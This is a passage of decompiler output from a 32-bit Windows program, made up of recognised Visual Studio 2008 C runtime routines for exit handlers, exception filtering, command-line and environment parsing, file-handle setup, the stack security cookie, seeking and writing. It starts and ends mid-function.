      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0041b3e8 = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_0041b3e4 = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040af88();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_0040cd5b();
  return p_Var1;
}



void FUN_0040cd5b(void)

{
  FUN_0040af91();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041498c;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



void FUN_0040ce14(void)

{
  return;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_00418b0c * 3);
    if ((puVar1 + DAT_00418b0c * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_00418b00 < DAT_00418b04 + DAT_00418b00) {
            iVar7 = DAT_00418b00 * 0xc;
            iVar8 = DAT_00418b00;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_00418b04 + DAT_00418b00);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wincmdln
// 
// Library: Visual Studio 2008 Release

byte * __wincmdln(void)

{
  byte bVar1;
  bool bVar2;
  int iVar3;
  byte *pbVar4;
  
  bVar2 = false;
  if (DAT_0041b3ec == 0) {
    ___initmbctable();
  }
  pbVar4 = DAT_0041b414;
  if (DAT_0041b414 == (byte *)0x0) {
    pbVar4 = &DAT_00414962;
  }
  do {
    bVar1 = *pbVar4;
    if (bVar1 < 0x21) {
      if (bVar1 == 0) {
        return pbVar4;
      }
      if (!bVar2) {
        for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
        }
        return pbVar4;
      }
    }
    if (bVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    iVar3 = __ismbblead((uint)bVar1);
    if (iVar3 != 0) {
      pbVar4 = pbVar4 + 1;
    }
    pbVar4 = pbVar4 + 1;
  } while( true );
}



// Library Function - Single Match
//  __setenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __setenvp(void)

{
  char **ppcVar1;
  size_t sVar2;
  char *_Dst;
  errno_t eVar3;
  char *pcVar4;
  int iVar5;
  
  if (DAT_0041b3ec == 0) {
    ___initmbctable();
  }
  iVar5 = 0;
  pcVar4 = DAT_00419490;
  if (DAT_00419490 != (char *)0x0) {
    for (; *pcVar4 != '\0'; pcVar4 = pcVar4 + sVar2 + 1) {
      if (*pcVar4 != '=') {
        iVar5 = iVar5 + 1;
      }
      sVar2 = _strlen(pcVar4);
    }
    ppcVar1 = (char **)__calloc_crt(iVar5 + 1,4);
    pcVar4 = DAT_00419490;
    DAT_004196c4 = ppcVar1;
    if (ppcVar1 != (char **)0x0) {
      do {
        if (*pcVar4 == '\0') {
          _free(DAT_00419490);
          DAT_00419490 = (char *)0x0;
          *ppcVar1 = (char *)0x0;
          DAT_0041b3e0 = 1;
          return 0;
        }
        sVar2 = _strlen(pcVar4);
        sVar2 = sVar2 + 1;
        if (*pcVar4 != '=') {
          _Dst = (char *)__calloc_crt(sVar2,1);
          *ppcVar1 = _Dst;
          if (_Dst == (char *)0x0) {
            _free(DAT_004196c4);
            DAT_004196c4 = (char **)0x0;
            return -1;
          }
          eVar3 = _strcpy_s(_Dst,sVar2,pcVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppcVar1 = ppcVar1 + 1;
        }
        pcVar4 = pcVar4 + sVar2;
      } while( true );
    }
  }
  return -1;
}



// Library Function - Single Match
//  _parse_cmdline
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall
_parse_cmdline(undefined4 param_1,byte *param_2,byte **param_3,byte *param_4,int *param_5)

{
  bool bVar1;
  bool bVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte bVar6;
  byte *pbVar7;
  byte *pbVar8;
  int *unaff_EDI;
  
  *unaff_EDI = 0;
  *param_5 = 1;
  if (param_3 != (byte **)0x0) {
    *param_3 = param_4;
    param_3 = param_3 + 1;
  }
  bVar2 = false;
  pbVar5 = param_4;
  do {
    if (*param_2 == 0x22) {
      bVar2 = !bVar2;
      bVar6 = 0x22;
      pbVar7 = param_2 + 1;
    }
    else {
      *unaff_EDI = *unaff_EDI + 1;
      if (pbVar5 != (byte *)0x0) {
        *pbVar5 = *param_2;
        param_4 = pbVar5 + 1;
      }
      bVar6 = *param_2;
      pbVar7 = param_2 + 1;
      iVar3 = __ismbblead((uint)bVar6);
      if (iVar3 != 0) {
        *unaff_EDI = *unaff_EDI + 1;
        if (param_4 != (byte *)0x0) {
          *param_4 = *pbVar7;
          param_4 = param_4 + 1;
        }
        pbVar7 = param_2 + 2;
      }
      pbVar5 = param_4;
      if (bVar6 == 0) {
        pbVar7 = pbVar7 + -1;
        goto LAB_0040d146;
      }
    }
    param_2 = pbVar7;
  } while ((bVar2) || ((bVar6 != 0x20 && (bVar6 != 9))));
  if (pbVar5 != (byte *)0x0) {
    pbVar5[-1] = 0;
  }
LAB_0040d146:
  bVar2 = false;
  while (*pbVar7 != 0) {
    for (; (*pbVar7 == 0x20 || (*pbVar7 == 9)); pbVar7 = pbVar7 + 1) {
    }
    if (*pbVar7 == 0) break;
    if (param_3 != (byte **)0x0) {
      *param_3 = pbVar5;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
    while( true ) {
      bVar1 = true;
      uVar4 = 0;
      for (; *pbVar7 == 0x5c; pbVar7 = pbVar7 + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*pbVar7 == 0x22) {
        pbVar8 = pbVar7;
        if (((uVar4 & 1) == 0) && ((!bVar2 || (pbVar8 = pbVar7 + 1, *pbVar8 != 0x22)))) {
          bVar1 = false;
          bVar2 = !bVar2;
          pbVar8 = pbVar7;
        }
        uVar4 = uVar4 >> 1;
        pbVar7 = pbVar8;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (pbVar5 != (byte *)0x0) {
          *pbVar5 = 0x5c;
          pbVar5 = pbVar5 + 1;
        }
        *unaff_EDI = *unaff_EDI + 1;
        param_4 = pbVar5;
      }
      bVar6 = *pbVar7;
      if ((bVar6 == 0) || ((!bVar2 && ((bVar6 == 0x20 || (bVar6 == 9)))))) break;
      if (bVar1) {
        if (pbVar5 == (byte *)0x0) {
          iVar3 = __ismbblead((int)(char)bVar6);
          if (iVar3 != 0) {
            pbVar7 = pbVar7 + 1;
            *unaff_EDI = *unaff_EDI + 1;
          }
        }
        else {
          iVar3 = __ismbblead((int)(char)bVar6);
          if (iVar3 != 0) {
            *param_4 = *pbVar7;
            pbVar7 = pbVar7 + 1;
            *unaff_EDI = *unaff_EDI + 1;
            param_4 = param_4 + 1;
          }
          *param_4 = *pbVar7;
          param_4 = param_4 + 1;
        }
        *unaff_EDI = *unaff_EDI + 1;
        pbVar5 = param_4;
      }
      pbVar7 = pbVar7 + 1;
    }
    if (pbVar5 != (byte *)0x0) {
      *pbVar5 = 0;
      pbVar5 = pbVar5 + 1;
      param_4 = pbVar5;
    }
    *unaff_EDI = *unaff_EDI + 1;
  }
  if (param_3 != (byte **)0x0) {
    *param_3 = (byte *)0x0;
  }
  *param_5 = *param_5 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __setargv(void)

{
  uint uVar1;
  byte **ppbVar2;
  undefined4 extraout_ECX;
  uint _Size;
  uint local_10;
  uint local_c;
  byte *local_8;
  
  if (DAT_0041b3ec == 0) {
    ___initmbctable();
  }
  DAT_00419b5c = 0;
  GetModuleFileNameA((HMODULE)0x0,&DAT_00419a58,0x104);
  _DAT_004196d4 = &DAT_00419a58;
  if ((DAT_0041b414 == (byte *)0x0) || (local_8 = DAT_0041b414, *DAT_0041b414 == 0)) {
    local_8 = &DAT_00419a58;
  }
  _parse_cmdline(extraout_ECX,local_8,(byte **)0x0,(byte *)0x0,(int *)&local_c);
  uVar1 = local_c;
  if ((local_c < 0x3fffffff) && (local_10 != 0xffffffff)) {
    _Size = local_c * 4 + local_10;
    if ((local_10 <= _Size) && (ppbVar2 = (byte **)__malloc_crt(_Size), ppbVar2 != (byte **)0x0)) {
      _parse_cmdline(_Size,local_8,ppbVar2,(byte *)(ppbVar2 + uVar1),(int *)&local_c);
      _DAT_004196b8 = local_c - 1;
      _DAT_004196bc = ppbVar2;
      return 0;
    }
  }
  return -1;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsA
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsA(void)

{
  char cVar1;
  WCHAR WVar2;
  DWORD DVar3;
  WCHAR *pWVar4;
  WCHAR *pWVar5;
  int iVar6;
  size_t _Size;
  LPSTR lpMultiByteStr;
  LPCH _Src;
  char *pcVar7;
  void *_Dst;
  LPWCH lpWideCharStr;
  LPSTR local_8;
  char *pcVar8;
  
  lpWideCharStr = (LPWCH)0x0;
  if (DAT_00419b60 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_00419b60 = 1;
      goto LAB_0040d35c;
    }
    DVar3 = GetLastError();
    if (DVar3 == 0x78) {
      DAT_00419b60 = 2;
    }
  }
  if (DAT_00419b60 != 1) {
    if ((DAT_00419b60 != 2) && (DAT_00419b60 != 0)) {
      return (LPVOID)0x0;
    }
    _Src = GetEnvironmentStrings();
    if (_Src == (LPCH)0x0) {
      return (LPVOID)0x0;
    }
    cVar1 = *_Src;
    pcVar7 = _Src;
    while (cVar1 != '\0') {
      do {
        pcVar8 = pcVar7;
        pcVar7 = pcVar8 + 1;
      } while (*pcVar7 != '\0');
      pcVar7 = pcVar8 + 2;
      cVar1 = *pcVar7;
    }
    _Dst = __malloc_crt((size_t)(pcVar7 + (1 - (int)_Src)));
    if (_Dst == (void *)0x0) {
      FreeEnvironmentStringsA(_Src);
      return (LPVOID)0x0;
    }
    _memcpy(_Dst,_Src,(size_t)(pcVar7 + (1 - (int)_Src)));
    FreeEnvironmentStringsA(_Src);
    return _Dst;
  }
LAB_0040d35c:
  if ((lpWideCharStr == (LPWCH)0x0) &&
     (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr == (LPWCH)0x0)) {
    return (LPVOID)0x0;
  }
  WVar2 = *lpWideCharStr;
  pWVar5 = lpWideCharStr;
  while (WVar2 != L'\0') {
    do {
      pWVar4 = pWVar5;
      pWVar5 = pWVar4 + 1;
    } while (*pWVar5 != L'\0');
    pWVar5 = pWVar4 + 2;
    WVar2 = *pWVar5;
  }
  iVar6 = ((int)pWVar5 - (int)lpWideCharStr >> 1) + 1;
  _Size = WideCharToMultiByte(0,0,lpWideCharStr,iVar6,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
  local_8 = (LPSTR)0x0;
  if (((_Size != 0) && (lpMultiByteStr = (LPSTR)__malloc_crt(_Size), lpMultiByteStr != (LPSTR)0x0))
     && (iVar6 = WideCharToMultiByte(0,0,lpWideCharStr,iVar6,lpMultiByteStr,_Size,(LPCSTR)0x0,
                                     (LPBOOL)0x0), local_8 = lpMultiByteStr, iVar6 == 0)) {
    _free(lpMultiByteStr);
    local_8 = (LPSTR)0x0;
  }
  FreeEnvironmentStringsW(lpWideCharStr);
  return local_8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x40d44a;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_0040d689:
    iVar7 = -1;
  }
  else {
    DAT_0041b2c4 = 0x20;
    DAT_0041b2e0 = puVar2;
    for (; puVar2 < DAT_0041b2e0 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_0041b2c4 < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_0041b2c4,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_0041b2e0)[local_24] = puVar2;
        DAT_0041b2c4 = DAT_0041b2c4 + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_0041b2e0)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_0041b2e0)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_0040d689;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_0041b2e0 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_0040d689;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_0041b2c4);
    iVar7 = 0;
  }
  return iVar7;
}



// WARNING: Removing unreachable block (ram,0x0040d6a6)
// WARNING: Removing unreachable block (ram,0x0040d6ac)
// WARNING: Removing unreachable block (ram,0x0040d6ae)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00418df8 == 0xbb40e64e) || ((DAT_00418df8 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00418df8 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00418df8 == 0xbb40e64e) {
      DAT_00418df8 = 0xbb40e64f;
    }
    else if ((DAT_00418df8 & 0xffff0000) == 0) {
      DAT_00418df8 = DAT_00418df8 | DAT_00418df8 << 0x10;
    }
    DAT_00418dfc = ~DAT_00418df8;
  }
  else {
    DAT_00418dfc = ~DAT_00418df8;
  }
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040d7a5:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0040d7a5;
      }
    }
    pbVar1 = (byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041b2c4)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041b2e0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_0040d908();
      }
      goto LAB_0040d902;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0040d902:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_0040d908(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0040e038;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040e038;
  }
  piVar4 = &DAT_0041b2e0 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040e038;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_0040dca9:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_0040dfa9:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_0040dfb5:
      if (local_1acc != (char *)0x0) goto LAB_0040e038;
      goto LAB_0040dfbe;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0040dffa;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
